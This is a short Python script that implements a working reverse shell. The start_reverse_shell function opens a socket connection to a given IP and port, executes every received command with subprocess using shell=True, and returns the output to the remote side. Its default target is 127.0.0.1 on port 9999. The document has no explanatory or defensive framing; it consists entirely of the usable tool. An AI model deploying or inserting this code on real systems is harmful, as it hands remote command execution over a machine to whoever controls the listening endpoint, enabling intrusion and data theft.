import socket
import subprocess

def start_reverse_shell(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    try:
        while True:
            command = client.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            if command.strip():
                try:
                    output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                except subprocess.CalledProcessError as e:
                    output = e.output
                client.sendall(output)
    except Exception as e:
        print(f"[-] Exception: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    target_ip = "127.0.0.1"
    target_port = 9999
    start_reverse_shell(target_ip, target_port)